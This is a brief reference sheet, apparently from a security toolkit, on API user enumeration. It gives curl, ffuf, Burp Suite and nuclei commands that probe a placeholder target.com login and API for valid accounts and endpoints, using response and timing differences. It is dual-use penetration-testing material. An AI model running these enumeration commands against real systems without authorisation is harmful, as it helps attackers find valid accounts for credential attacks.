<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Detecting API Enumeration Attacks

## curl — Response Differential Analysis
```bash
# Compare login responses for valid vs invalid users
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"valid@target.com","password":"wrong"}' \
  https://target.com/api/login | jq '.message'

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"invalid@target.com","password":"wrong"}' \
  https://target.com/api/login | jq '.message'

# Timing-based enumeration
curl -s -o /dev/null -w "%{time_total}" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"valid@target.com","password":"x"}' https://target.com/api/login
```

## ffuf — Automated Enumeration
```bash
# Username enumeration via login differential
ffuf -u https://target.com/api/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ@target.com","password":"x"}' \
  -w usernames.txt -mc all -fr "Invalid credentials" -o enum.json -of json

# Endpoint enumeration
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,403 -o endpoints.json -of json
```

## Burp Suite — Enumeration Analysis
```
1. Capture login requests for valid and invalid users
2. Send to Comparer to identify response differences
3. Use Intruder with username wordlist
4. Sort by response length to identify valid accounts
```

## nuclei — Enumeration Detection
```bash
nuclei -u https://target.com -t http/vulnerabilities/user-enumeration.yaml
```
